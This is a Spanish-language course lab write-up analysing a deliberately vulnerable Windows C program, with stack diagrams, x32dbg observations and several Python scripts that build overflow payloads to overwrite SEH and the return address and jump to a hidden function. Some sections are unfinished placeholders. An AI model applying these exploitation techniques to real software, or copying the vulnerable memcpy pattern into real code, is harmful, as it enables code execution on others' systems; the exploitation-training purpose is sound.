# An√°lisis del c√≥digo del binario
```c
#include <stdio.h>
#include <string.h>

void call_me() {
	printf("You cannot call me, noob!\n");
}

void parse_file(char* filename){
	char url[16];
	char buffer[512];

	printf("Abriendo fichero %s ...\n", filename);

	FILE *f = fopen(filename, "r");
	if(f == NULL){
		printf("Fallo al abrir el fichero :(\n");
		return;
	}
	printf("Leyendo fichero %s ...\n", filename);

	fread(buffer, 1, 256, f);
	printf("Fichero leido! Contenido: \n");
	//printf(buffer);

	printf("\nBuscando URL en el fichero..\n");

	char* url_start = strstr(buffer, "http://");
	if(url_start == NULL){
		printf("URL no encontrada :(\n");
		return;
	}

	memcpy(url, url_start, 512);

	printf("URL: %s\n", url);

	fclose(f);
	return;
}

int main(int argc, char** argv) {
	if(argc != 2){
		printf("Uso: %s <fichero>\n", argv[0]);
		return -1;
	}

	parse_file(argv[1]);
	return 0;
}
```

Este binario amplia el binario [stack1](https://github.com/soniasalido/cybersecurity/blob/main/LABS/Investigating%20Malware/Master-ENIIT-Analisis-Malware-Reversing/stack-buffer-overflow/stack1/stack1.md). Lee el fichero que se pasa como par√°metro y busca en el, el contenido la subcadena `"http://"`. 
- Si no la encuentra: muestra en pantalla: `URL no encontrada :(` y vuelve.
- Si la encuentra, hace:
  ```c
  memcpy(url, url_start, 512);
  printf("URL: %s\n", url);
  ```
  - Copia desde donde empieza "http://" hasta 512 bytes (**esto est√° mal, porque url s√≥lo tiene 16 bytes**) y,
  - luego intenta imprimirlo en pantalla como cadena.

El programa lee los primeros 256 bytes de un fichero, busca dentro de ellos una cadena que empiece por "http://", y si la encuentra intenta copiarla a url y mostrarla por pantalla (aunque lo hace de forma insegura y con desbordamiento de buffer). Usaremos este desbordamiento que aprovecha una vulnerabilidad en el programa para acceder a una funci√≥n que no deber√≠a ser llamada (`call_me`) y para lanzar la calculadora.

---------------------------------------
# Problemas de seguridad detectados en el codigo C
## 1. buffer no est√° terminado en '\0'
```c
char buffer[512];
...
fread(buffer, 1, 256, f);
...
char* url_start = strstr(buffer, "http://");
```
donde:
- fread lee hasta 256 bytes sin a√±adir '\0'.
- strstr espera una cadena C terminada en '\0'.
- Como buffer no est√° terminado, strstr puede leer m√°s all√° de esos 256 bytes (memoria basura) ‚Üí comportamiento indefinido.

## 2. Desbordamiento de `url`
```c
char url[16];
...
memcpy(url, url_start, 512);
```
donde:
- `url` tiene tama√±o 16 bytes.
- Estamos copiando 512 bytes desde `url_start` a `url`.
- Es un stack-based buffer overflow de manual: pisamos todo lo que haya despu√©s de url en la pila (variables locales, puntero de retorno, etc.).

Adem√°s:
- No se a√±ade '\0' a url, as√≠ que luego:
```c
printf("URL: %s\n", url);
```
donde:
- espera que `url` est√© terminada en '\0', y volver√° a leer memoria fuera del buffer.


**<mark>El desbordamiento que tenemos con memcpy(url, ...), podr√≠a ser usado para machacar:</mark>**
- `url`
- variables locales
- EBP
- RET
- SEH


## 3. Posible format string (aunque est√° comentado)
```c
//printf(buffer);
```
donde:
- Si esto se descomenta, tendremos una format string vulnerability:
	- `printf` interpreta el contenido de buffer como formato, no como texto plano.
	- Si el fichero contiene cosas como `%x`, `%n`, etc., podemos leer/escribir memoria.


---------------------------------------
# ¬øQue se desborda `url` o `buffer`?
```c
char url[16];
char buffer[512];
...
fread(buffer, 1, 256, f);       // ‚Üê escribe en buffer
...
char* url_start = strstr(buffer, "http://");
...
memcpy(url, url_start, 512);    // ‚Üê copia desde url_start (dentro de buffer) a url
```
donde:
- `buffer` tiene 512 bytes.
- `fread(buffer, 1, 256, f);` escribe como mucho 256 bytes en `buffer` ‚Üí ah√≠ NO hay overflow, estamos escribiendo 256 dentro de 512.
- `url` tiene 16 bytes.
- **`memcpy(url, url_start, 512);` copia 512 bytes a partir de url_start ‚Üí el destino (url) s√≥lo tiene 16 ‚Üí aqu√≠ S√ç hay overflow.**


Resumiendo:
- Origen de `memcpy`: una posici√≥n dentro de `buffer` (`url_start`).
- Destino de `memcpy`: `url` (16 bytes).
- Lo que reventamos: `url` y lo que venga despu√©s en la pila: otras variables, `EBP`, `RET`, `SEH`, etc.


---------------------------------------
# Posible Layout de la pila para la funci√≥n `parse_file`:
```c
          ‚ñ≤  direcciones M√ÅS ALTAS ‚Üí Arriba = direcciones grandes ‚Üí  direcciones de memoria absolutas
          ‚îÇ
          ‚îÇ  (stack de la funci√≥n que llama a parse_file)
          ‚îÇ
0x......  +------------------------------+
          |   argumentos del caller      |
          +------------------------------+
          |   return address a caller    |  ‚Üê [ebp+4]
          +------------------------------+
          |   EBP viejo (del caller)     |  ‚Üê [ebp]
EBP -->   +------------------------------+

          |   FILE *f                  |  ‚Üê [ebp-4]
          +------------------------------+
          |   char *url_start          |  ‚Üê [ebp-8]
          +------------------------------+
          |   padding/alineaci√≥n?      |
          +------------------------------+
          |   url[16]                  |  ‚Üê [ebp-20]..[ebp-0x11] - Ocupa 16 Bytes
          +------------------------------+
          |   buffer[512]              |  ‚Üê [ebp-220]..[ebp-0x21]
          +------------------------------+
          |   (quiz√° m√°s locals)       |
          +------------------------------+
ESP -->   |   SEH.next                 |  ‚Üê estructura SEH
          +------------------------------+
          |   SEH.handler              |
          +------------------------------+
          |   m√°s cosas por debajo...  |
          +------------------------------+
          ‚ñº  direcciones M√ÅS BAJAS ‚Üí Abajo = direcciones peque√±as  ‚Üí  direcciones de memoria absolutas

```
donde:
- Las variables locales (`buffer`, `url`, `f`, `url_start`) est√°n entre `EBP` y el `SEH`.
- El registro `SEH` (los dos DWORD `next` y `handler`) cuelga por `debajo` de las variables locales, cerca de `ESP`. Windows lleva una lista enlazada de estos registros, cuyo principio est√° en FS:[0].
- Frame de la funci√≥n (desde el punto de vista de C):
	- argumentos arriba (`filename`),
	- `return address`,
	- `EBP viejo`,
	- variables locales (`f`, `url_start`, `url`, `buffer`,‚Ä¶),
	- y al final, si el compilador lo usa, la estructura `SEH`.
- Estructura `SEH` en la pila:
	- cada registro `SEH` en la pila tiene dos DWORD:
		```
   		struct EXCEPTION_REGISTRATION {
   			struct EXCEPTION_REGISTRATION *next;
   			PEXCEPTION_HANDLER handler;
		};
  		```


---------------------------------------
# Lo que ocurre en el proceso del overflow
- Cuando memcpy va escribiendo `url[0]`, `url[1]`, ..., `url[15]`, va llenando:
	- `[ebp-20]`, `[ebp-1F]`, ... `[ebp-0F]` ‚Üí  (los 16 primeros bytes).

- Pero como le decimos que copie 512, sigue escribiendo bytes m√°s all√°:
	- `url[16]` pisar√° lo que haya justo `encima` de `url`
	- y as√≠ sucesivamente hasta llegar a:
		- `url_start`
		- `f`
		- `saved EBP`
		- la direcci√≥n de retorno (`[ebp+4]`)
		- y, si el frame y el tama√±o lo permiten, tambi√©n la estructura `SEH` (que est√° unos bytes m√°s `arriba` en memoria, porque desde el punto de vista de url vamos `subiendo`).


## En direcci√≥n l√≥gica desde `url` hacia `arriba`:
```asm
url  ‚Üí  url_start  ‚Üí  f  ‚Üí  EBP guardado  ‚Üí  RET  ‚Üí  SEH.next  ‚Üí  SEH.handler
```
donde:
- `url` = 16 bytes ‚Üí Ocupa 0x10 bytes ‚Üí offsets 0x00 a 0x0F
- `EBP` = `url` + 0x20 ‚Üí Empieza 32 bytes desde el inicio de `url` (0x20 = 32)
- `RET` = `url` + 0x24  ‚Üí Empieza 36 bytes desde el inicio de `url` (0x24 = 36)
- `nSEH` = `url` + x ‚Üí Ese x hay que medirlo con el debugger ‚Üí (que es justo lo que se hace en los v√≠deos: mandar patrones para ver en qu√© offset salen)
- `SEH` = `url` + (x+4)

## La direcci√≥n del overflow 
La cadena anterior sirve como idea de por d√≥nde se va extendiendo el overflow desde url hacia `arriba` en la pila. Pero en la pr√°ctica, el orden exacto de `url_start` y `f` puede cambiar (el compilador puede poner primero `f` y luego `url_start`). Esa cadena s√≥lo sirve para entender el camino del overflow.

## Camnio del overflow
```
`buffer` (no se toca)
‚Üì
`url`   (destino del memcpy)
‚Üì
`url_start`
‚Üì
`f`
‚Üì
`EBP guardado`
‚Üì
`RET`
‚Üì
`nSEH`
‚Üì
`SEH.handler`
```

Buffer est√° `debajo` de `url`. El overflow arranca en `url` y se extiende hacia `las cosas` que est√°n `por encima` en la pila: primero `url_start` y `f`, luego `EBP`, luego `RET`, y si hay bytes suficientes, tambi√©n `nSEH` y `SEH.handler`.
- `Arriba` = direcciones m√°s bajas
- `Abajo` = direcciones m√°s altas
- `memcpy` va siempre hacia abajo


## El overflow usando los offsets
Base = `url`  = 0x0012FF00
```c
0x0012FF00   buffer[512]
0x0012FF20   url[16]         ‚Üê empezamos a escribir aqu√≠
0x0012FF30   url_start
0x0012FF34   f
0x0012FF38   EBP guardado
0x0012FF3C   RET
0x0012FF40   nSEH
0x0012FF44   SEH.handler
```

---------------------------------------
# El patr√≥n del payload
Offsets desde `&url[0]`:
| Campo       | Tama√±o | Offset inicio | Offset fin |
| ----------- | ------ | ------------- | ---------- |
| `url`       | 16 B   | 0x00          | 0x0F       |
| `url_start` | 4 B    | 0x10          | 0x13       |
| `f`         | 4 B    | 0x14          | 0x17       |
| padding     | 4 B    | 0x18          | 0x1B       |
| **EBP**     | 4 B    | 0x1C          | 0x1F       |
| **RET**     | 4 B    | 0x20          | 0x23       |
| **nSEH**    | 4 B    | 0x24          | 0x27       |
| **SEH**     | 4 B    | 0x28          | 0x2B       |

```
(‚Üë dir. m√°s bajas)

    [ ... cosas anteriores ... ]
    [ buffer[512] ]
    [ url[16] ]       ‚Üê &url[0]  offset 0x00
    [ url_start ]     ‚Üê offset 0x10
    [ f ]             ‚Üê offset 0x14
    [ padding ]       ‚Üê offset 0x18
    [ EBP ]           ‚Üê offset 0x1C
    [ RET ]           ‚Üê offset 0x20
    [ nSEH ]          ‚Üê offset 0x24
    [ SEH ]           ‚Üê offset 0x28
    [ ... otras cosas ... ]

(‚Üì dir. m√°s altas)
```

**Payload de ejemplo:**
```
payload =
  "A"*16   +		‚¨Ö `url`
  "B"*4    +		‚¨Ö `url_start`
  "C"*4    +		‚¨Ö `f`
  "D"*4    +		‚¨Ö `padding`
  "E"*4    +		‚¨Ö `EBP`
  "F"*4    +		‚¨Ö `RET`
  "G"*8				‚¨Ö `SEH`
```
donde:
- A: 16 bytes
- B: 4 bytes
- C: 4 bytes
- D: 4 bytes
- E: 4 bytes
- F: 4 bytes
- G: 8 bytes  
‚Üí Total: 44 bytes = 0x2C bytes


---------------------------------------
# Posibles usos de este overflow en `url`
### 1. Sobreescribir `SEH` ‚Üí V√≠deos de clase del tema.
‚Üí ‚Üí ‚Üí [Ir a la sobreescritura de `SEH`](#explotaci√≥n-del-overflow-para-sobreescribir-seh) ‚Üí ‚Üí ‚Üí



### 2. Sobreescribir `RET` ‚Üí Direcci√≥n de retorno de `parse_file`.
‚Üí ‚Üí ‚Üí [Ir a la sobreescritura de `RET`](#explotaci√≥n-del-overflow-para-sobreescribir-ret) ‚Üí ‚Üí ‚Üí


### 3. Corrupci√≥n de punteros/variables internas (`f`, `url_start`, etc.)
Luego estos punteros/variables son usados en llamadas de biblioteca.  
‚Üí ‚Üí ‚Üí Ir a la sobreescritura de `f` ‚Üí ‚Üí ‚Üí


### 4. Vulnerabilidad de formato si se descomenta `printf(buffer)`.


---------------------------------------
# Primera ejecuci√≥n del binario
Ejecutamos el binario con x32dbg para ir entendiendo c√≥mo funciona. Vamos a usar el siguiente patr√≥n como payload:
```python
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 600
p += struct.pack("<I", 0)
p += struct.pack("<I", 0)
p += struct.pack("<I", 0)
p += struct.pack("<I", 0x42424242)
p += struct.pack("<I", CALL_ME)

with open("exp.txt", "wb") as f:
    f.write(p)
```
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena.png)
donde:
- El EIP est√° en el offset 00401620 que x32dbg rotula como: `call <JMP.&memcpy>`. En ensamblador estamos viendo el momento exacto en que va a ocurrir esto  ‚Üí memcpy va a copiar 256 bytes (0x100).
- Pero el buffer de destino `(url)` solo tiene 16 bytes y se poducir√° un overflow.


---------------------------------------
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-2.png)
donde:
- El EIP est√° en el offset 00401625.
- Recordemos: `memcpy(url, url_start, 512);` --> [Ver: ¬øQu√© se desborda?](#que-se-desborda-url-o-buffer)
- `memcpy` escribe el contenido del payload que se meti√≥ en una posici√≥n dentro de buffer (url_start), en `url`.
- Entonces, se exceder√° `url` y pisar√° las variables locales, el `EBP` guardado y el `ret` de la funci√≥n (direcci√≥n de retorno), etc.


---------------------------------------
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-5.png)
donde:
- EIP = 00401633. Estamos en el `call printf` de la funci√≥n `parse_file`.
- EBP = 0022FEA8
- ESP = 0022FC70
- En la pila:
	- 1: [esp]    4040C0   "URL: %s\n"   ‚Üê primer argumento de printf (formato)
	- 2: [esp+4]  0022FE88               ‚Üê segundo argumento (puntero a `url`)
	- 3: [esp+8]  00000100
	- 4: [esp+C]  6FFF2960 "AAAAAAA..."
- En el dump de memoria:
	- Address   ASCII
	- 0022FE88  "http://AAAAAAAAAA..."
	- 0022FE98  "AAAAAAAAAAAAAAAA..."

En resumen, en esta captura vemos que **en el stack frame de la funci√≥n `parse_file`, la variable local `url` est√° en `[EBP-0x20]`:**
- EBP = 0022FEA8
- EBP - 0x20 = 0022FE88  ‚Üê aqu√≠ est√° el puntero a `url` que contiene "http://AAAA..."



---------------------------------------
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-6.png)
donde:
- EIP = 00401638.
- Estamos dentro de `parse_file`, justo antes de llamar a `fclose(f)`.
- EBP = 0022FEA8.
- ESP = 0022FC70.
- [esp] = puntero al formato "URL: %s\n" (lo vemos en el dump en 0022FC70 ‚Üí 004040C0).
- [esp+4] = puntero a `url`: 0022FE88
- `f` vemos que est√° corrompido:
	- `[ebp-0x0C]` (es decir, `EBP - 12 = 0x0022FE9C`) contiene `0x41414141`.
	- Esa posici√≥n `[ebp-0x0C]` es justo donde el compilador ha colocado `FILE *f`.
- Pero como `f = 0x41414141`, cuando llame a `fclose`:
	- `fclose` va a intentar usar ese puntero falso.
 	- Se producir√° una EXCEPTION_ACCESS_VIOLATION.
- Entonces el sistema mirar√° la cadena `SEH`:
	- Pero como tambi√©n la hemos machacado con 0x41414141 ‚¨Ö‚¨Ö‚¨Ö‚¨Ö‚¨Ö Ah√≠ es donde entrar√° la explotaci√≥n por SEH que vemos en el v√≠deo de clase.


---------------------------------------
![stack2-encuentra-cadena](capturas/stack2-encuentra-cadena-7.png)
donde:
- EIP = 0040163E ‚Üí estamos en el `call <JMP.&fclose>`.
- En el panel de registros: `EAX = 41414141`.
- En el Default (stdcall): `[esp] = 41414141` ‚Üí es decir, el argumento que se va a pasar a `fclose` es `0x41414141`.
- Eso significa que nuestro overflow:
	- Ha sobrescrito la variable local `f` (el FILE * devuelto por fopen),
	- de manera que cuando el c√≥digo hace `fclose(f)`, en realidad est√° haciendo: `fclose((FILE*)0x41414141);` Es un puntero totalmente inv√°lido ‚Üí cuando entremos en msvcrt!fclose, en cuanto intente dereferenciar ese puntero, lo normal es que se produzca una violaci√≥n de acceso y el programa hace un crash antes incluso de hacer el `ret` de `parse_file`.


<mark>**IMPORTANTE:**</mark>  
<mark>Si nuestro objetivo es SEH exploit, nos interesa precisamente que `f` se corrompa (41414141) ‚Üí para que se produzca la excepci√≥n ‚Üí entra SEH.</mark>

<mark>Si nuestro objetivo es un RET exploit ‚Äúlimpio‚Äù (llegar hasta el ret sin que antes se dispare una excepci√≥n):</mark>  
	<mark>- Necesitamos que `f` siga siendo un puntero v√°lido cuando se ejecute `fclose`.</mark>  
	<mark>- Eso implica que la parte del payload que cae sobre `[ebp-0C]` no destruya el valor real de `f` (en este `run: 6FFF2960`).</mark>  




## An√°lisis del punto `00401608`
![stack2-00401613](capturas/stack2-00401613.png)
```c
00401608  C74424 08 00010000   mov dword ptr ss:[esp+8], 100h	; 0x100 = 256 - Esto tercer argumento de memcpy ‚Üí el tama√±o - Escribe el valor 0x100 (256d) en [esp+8]
00401610  8945 F0             mov dword ptr ss:[ebp-10], eax	; Guarda en la variable local situada en [ebp-10] el valor de EAX. Resultado `url_start = EAX;`
00401613  894424 04           mov dword ptr ss:[esp+4], eax		; `[esp+4]` es el segundo par√°metro de `memcpy ‚Üí src`.  Resultado: src = url_start;
00401617  8D45 E0             lea eax, dword ptr ss:[ebp-20]	; Calcula la direcci√≥n de `[ebp-20]` y la mete en EAX.  Resultado: EAX = &url;
0040161A  890424              mov dword ptr ss:[esp], eax		; `[esp]` es el primer par√°metro de `memcpy ‚Üí dst`. Resultado: dst = url;
0040161D  E8 47110000         call <JMP.&memcpy>				; Llama a `memcpy` con los tres par√°metros que acabamos de preparar en la pila.
```

Ese bloque es la preparaci√≥n de la llamada a memcpy que viene de:
```c
memcpy(url, url_start, 512);   // el compilador la ha dejado en 256 (0x100)
```

En 32 bits, los par√°metros de una funci√≥n como `memcpy(dst, src, size)` se pasan as√≠ en la pila:
- `[esp]` ‚Üí 1er par√°metro ‚Üí `dst`
- `[esp+4]` ‚Üí 2¬∫ par√°metro ‚Üí `src`
- `[esp+8]` ‚Üí 3er par√°metro ‚Üí `size`


**<mark>En el v√≠deo de tutor√≠a, aparece un cambio en este punto:</mark>**
```c
00401608  C74424 08 00010000   mov dword ptr ss:[esp+8], 200h
```
![stack2-00401613-video-clase](capturas/stack2-00401613-video-clase.png)

**<mark>Este detalle ¬øcambia significativamente la explotacion? Si no se edita manualmente ese valor y se cambia por 200, no se puede explotar la vulnerabilidad.</mark>**
![stack2-00401613-edicion-manual](capturas/stack2-00401613-edicion-manual.png)

En mi binario copia 256 bytes:
```c
mov [esp+8], 100h   ; 256 bytes
```

En el binario del v√≠deo copia 512 bytes:
```c
mov [esp+8], 200h   ; 512 bytes
```

En este ejercicio se hace una explotaci√≥n basada en SEH (Structured Exception Handler), es decir, manipulando la cadena de manejadores de excepciones que Windows almacena en la pila. La posici√≥n del SEH en la pila es fija para ese binario.
Pero el desbordamiento tiene que alcanzar esa posici√≥n para afectarlo.

**Conceptualmente podr√≠amos ver la explotaci√≥n de este binario:** Un binario Windows 32-bit organiza la pila as√≠:
```
+------------------+
| Variables locales |
+------------------+
| Saved EBP         |
+------------------+
| SEH Frame:        |
|   nSEH            |
|   SEH             |
+------------------+
| m√°s cosas...      |
```
donde:
- url est√° al principio de la zona local: 16 bytes.
- Luego variables intermedias.
- Luego EBP.
- Luego la estructura SEH.

En el v√≠deo de la tutor√≠a: `distancia(url ‚Üí SEH) ‚âà 400 bytes`  
‚Üí Necesita 512 bytes para alcanzarlo.  
‚Üí Con 256 no llega.  

**En mi binario con `mov [esp+8], 100h`:**
- First chance exception on 6FF63D9D (C0000005, EXCEPTION_ACCESS_VIOLATION) y a la derecha: ESI = 41414141 --> el overflow ha sobreescrito registros y memoria, pero‚Ä¶
	- üí• **NO ha sobreescrito SEH.**
	- üí• La cadena SEH sigue intacta (En el panel SEH: ‚ÄúEnd of SEH chain‚Äù).
	- La excepci√≥n ocurre dentro de msvcrt.dll (fclose, printf‚Ä¶), pero Windows no est√° llamando al ‚ÄúSEH modificado‚Äù porque NO est√° modificado.
 	- Resultado: **No podemos explotar el SEH.**
![stack2-00401613-mi-binario](capturas/stack2-00401613-mi-binario-100.png)
![stack2-00401613-mi-binario](capturas/stack2-00401613-mi-binario-100-2.png)



**En el binario del v√≠deo con mov `[esp+8], 200h`:**
- S√ç SE SOBREESCRIBE EL SEH.
- El overflow s√≠ alcanza el registro SEH y lo corrompe.
- Resultado: Se puede hacer explotaci√≥n SEH tal como muestra el profesor en el v√≠deo de la tutor√≠a.
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200.png)
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200-1.png)
![stack2-00401613-mi-binario-dato-200](capturas/stack2-00401613-mi-binario-dato-200-2.png)


---------------------------------------
# Explotaci√≥n del overflow para sobreescribir SEH
**Exploit para explotar la vulnerabilidad:**
```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'

with open("exp2.txt", "wb") as f:
    f.write(p)
```


```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 309 + b'BBBB' + b'CCCC'
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0x42424242)
#p += struct.pack("<I", CALL_ME)

with open("exp3.txt", "wb") as f:
    f.write(p)
```

**Otro script:**
```c
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 309 + b'BBBB'
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0)
#p += struct.pack("<I", 0x42424242)
p += struct.pack("<I", CALL_ME)

with open("exp4.txt", "wb") as f:
    f.write(p)
```

![stack2-you-cannot-call-me](capturas/stack2-you-cannot-call-me.png)

Se explota la vulnerabilidad ya que hemos conseguido modificar el valor de la funci√≥n que maneja la excepci√≥n.  

![stack2-you-cannot-call-me](capturas/stack2-you-cannot-call-me-2.png)
donde:
- Vemos valores de las Aes.
- Despues tenemos el primer elemento de la lista enlazada del manejador de excepciones ‚Üí  Pointer to SEH_Record `0022FFC4 | 42424242`
- Despu√©s tenemos la direcci√≥n de la funci√≥n que maneja la excepci√≥n ‚Üí `0022FFC8 | 00401530`. Que la hemos sobreescrito con la direcci√≥n de la funci√≥n `call_me`.
- Cuando se intenta manejar la excepci√≥n, llama a la funci√≥n `call_me`.


## Ejecuci√≥n de la calculadora

### Localizaci√≥n gadgets POP POP RET v√°lidos para el binario stack2.exe
En una explotaci√≥n SEH (Structured Exception Handler) en Windows, el objetivo es sobreescribir la estructura SEH para desviar la ejecuci√≥n hacia nuestro shellcode. Para hacerlo, necesitamos un gadget muy espec√≠fico dentro del binario o de alguna DLL que NO tenga SafeSEH / ASLR / DEP activo: üéØ POP POP RET

üéØ POP POP RET: Es una secuencia de instrucciones ensamblador:
```c
POP reg
POP reg
RET
```

üöÄ ¬øPor qu√© es tan importante en un exploit SEH? Cuando ocurre una excepci√≥n en Windows, el sistema hace:
- Busca en el stack la estructura SEH.
- Obtiene el handler (el puntero al manejador).
- Lo ejecuta cuando no existe SafeSEH / SEHOP.
- Pero ANTES de saltar al handler‚Ä¶ Windows hace dos POPs para limpiar la estructura SEH:
  ```c
  [ next SEH pointer ]   <-- offset 0
  [ exception handler ]   <-- offset +4   <-- ESTE lo sobreescribmos
  ```

  Cuando Windows entra al SEH:
  ```c
  POP reg   ; limpia next SEH
  POP reg   ; limpia el handler
  RET       ; salta a donde queramos
- üëâ Y ese RET saltar√° a nuestro c√≥digo malicioso en el stack (si controlamos EIP con un RET hacia nuestros datos).

**`EIP = 6FF5A030`:**
![stack2-calc](capturas/stack2-calc.png)
donde:
- xxxx.


**Primera Excepci√≥n en 6FF5A091:**
![stack2-calc](capturas/stack2-calc-2-c.png)
donde:
- La excepci√≥n ocurri√≥ dentro de `msvcrt.dll`, NO dentro de `stack2.exe`.
- Esto significa que nuestro desbordamiento pas√≥ completamente la funci√≥n vulnerable y termin√≥ corrompiendo estructuras internas usadas por `msvcrt` durante la limpieza del `stack` o la copia de memoria.
- Vemos `First chance exception`.
- El debugger nos deja continuar.
- Windows intenta ejecutar el `SEH` corrupto.
- ‚≠ê Entonces se ejecuta el `POP POP RET`.


**Ejecuci√≥n del `POP POP RET`:**
![stack2-calc](capturas/stack2-calc-3.png)


xxxx:
![stack2-calc](capturas/stack2-calc-5.png)

xxxx:
![stack2-calc](capturas/stack2-calc-4-b.png)



---------------------------------------
# Explotaci√≥n del overflow para sobreescribir `RET`

## Llamamos a la funci√≥n `call_me`
Explotaremos la vulnerabilidad para llamar a esta funci√≥n. Sabemos que:
- url = 16 bytes ‚Üí Ocupa 0x10 bytes ‚Üí offsets 0x00 a 0x0F
- EBP = url + 0x20 ‚Üí Empieza 32 bytes desde el inicio de url (0x20 = 32)
- RET = url + 0x24 ‚Üí Empieza 36 bytes desde el inicio de url (0x24 = 36)

Necesitaremos 

Usaremos el siguiente payload:
```
import struct

CALL_ME = 0x00401530

p = bytearray(b'http://')
p += b'A' * 305
p += struct.pack("<I", CALL_ME)

with open("exp-ret.txt", "wb") as f:
    f.write(p)
```


**Valor de la variable local `f`:**
Ponemos un breakpoint en: `call <JMP.&fopen>` y miramos EAX ‚Üí ese es el puntero real devuelto por fopen (FILE *):
![puntero-a-variable-f](capturas/puntero-a-variable-f.png)
donde:
- Siempre, en C stdcall/cdecl, el valor de retorno viene en EAX.
- EAX  = 6FFF2960   msvcrt.6FFF2960
- 6FFF2960 es el valor devuelto por fopen (el FILE *).
- Tambi√©n vemos que la variable local `f` est√° en `[ebp-0Ch]` ‚Üí direcci√≥n 0x0022FEC8.
- Todav√≠a vale 0, porque a√∫n NO se ha ejecutado el `mov [ebp-C],eax.`


Avanzamos un paso con F7:
![puntero-a-variable-f](capturas/puntero-a-variable-f-2.png)
donde:
- `dword ptr [ebp-C] = [0022FEC8] = msvcrt.6FFF2960`
	- La variable local `f` est√° en la direcci√≥n `[ebp-0xC] = 0x0022FEC8`.
 	- En esa direcci√≥n hay el valor 6FFF2960.
	- x32dbg lo etiqueta como msvcrt.6FFF2960 porque apunta a memoria del m√≥dulo msvcrt.dll.
- Este 6FFF2960 es exactamente el puntero `FILE *` que devolvi√≥ `fopen`.
- `f` (que es el `FILE *`) apunta a 6FFF2960.
- Esto es lo que luego se usar√° en `call fclose        ; fclose(f);`.
- Para que no haya EXCEPTION_ACCESS_VIOLATION cuando llamemos a `fclose`, `f` debe ser:
	- Un puntero a un FILE v√°lido (el que devolvi√≥ fopen en esta ejecuci√≥n), en nuestre caso concreto: 6FFF2960,
	- Pero hay que tener en cuenta que 6FFF2960 es el valor devuelto por `fopen` en esta ejecuci√≥n concreta.
 	- En otra ejecuci√≥n puede ser otro. (Que divertido :)
 


<mark>**IMPORTANTE:**</mark>  
<mark>Si nuestro objetivo es SEH exploit, nos interesa precisamente que `f` se corrompa (41414141) ‚Üí para que se produzca la excepci√≥n ‚Üí entra SEH.</mark>

<mark>Si nuestro objetivo es un RET exploit ‚Äúlimpio‚Äù (llegar hasta el ret sin que antes se dispare una excepci√≥n):</mark>  
	<mark>- Necesitamos que `f` siga siendo un puntero v√°lido cuando se ejecute `fclose`.</mark>  
	<mark>- Eso implica que la parte del payload que cae sobre `[ebp-0C]` no destruya el valor real de `f` (en este `run: 6FFF2960`).</mark>  


## Pr√≥logo de la funci√≥n parse file
![prologo-funcion-parse-file](capturas/prologo-funcion-parse-file.png)
donde:
- `push ebp`: Guarda el valor previo de EBP (del caller).
- `mov ebp, esp`: Ahora EBP apunta al inicio del stack frame de parse_file.
- `sub esp, 0x238`: Reserva 0x238 bytes = 568 bytes de variables locales.
- De esos 568 bytes salen:
	- `buffer[512]` ‚Üí 0x200 bytes ‚Üí 512 bytes.
	- `url[16]` ‚Üí 0x10 bytes ‚Üí 16 bytes.
 	- `f` es un puntero (`FILE *f`) ‚Üí 4 bytes.
  	- La variable `url_start` ‚Üí 4 bytes.
  	- Padding‚Ä¶ ‚Üí 568 - 512 - 16 - 4 -4 = 8 bytes.


El compilador lo organiza a√≠:
```c
ebp-4    ‚Üí f
ebp-8    ‚Üí url_start
ebp-20   ‚Üí url[16]
ebp-220  ‚Üí buffer[512]
```

| Variable           | Tama√±o              | Direcci√≥n relativa             |
| ------------------ | ------------------- | ------------------------------ |
| `f`                | 4 bytes             | `[ebp-4]`                      |
| `url_start`        | 4 bytes             | `[ebp-8]`                      |
| **padding**        | **8 bytes**         | entre `[ebp-8]` y `[ebp-20]`   |
| `url[16]`          | 16 bytes            | `[ebp-20]..[ebp-0x11]`         |
| **padding** extra? | 0 bytes adicionales | (justo despu√©s empieza buffer) |
| `buffer[512]`      | 512 bytes           | `[ebp-220]..[ebp-21]`          |





## Direcci√≥n exacta de `url`
![direccion-url](capturas/direccion-url.png)
donde:
- En esta parte del c√≥digo vemos c√≥mo se pone `url` como primer argumento de `memcpy`.
- `0040160B    lea eax, [ebp-20]` ‚Üí `eax` = direcci√≥n de `url`
- EAX = 0022FE88.
- `url` est√° en 0022FE88.

Tambi√©n podemos llegar a la misma conclusi√≥n:
- EBP = 0022FEA8
